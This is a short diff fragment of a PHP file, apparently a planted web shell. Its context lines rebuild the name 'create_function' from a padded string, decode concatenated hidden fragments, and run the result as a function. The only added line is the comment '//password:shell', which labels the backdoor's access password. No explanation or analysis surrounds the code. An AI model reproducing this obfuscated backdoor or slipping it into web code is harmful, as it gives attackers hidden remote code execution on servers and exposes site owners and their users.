@@ -9,3 +9,5 @@ $dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn");
 $zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx)));
 $zvm();
 ?>
+
+//password:shell
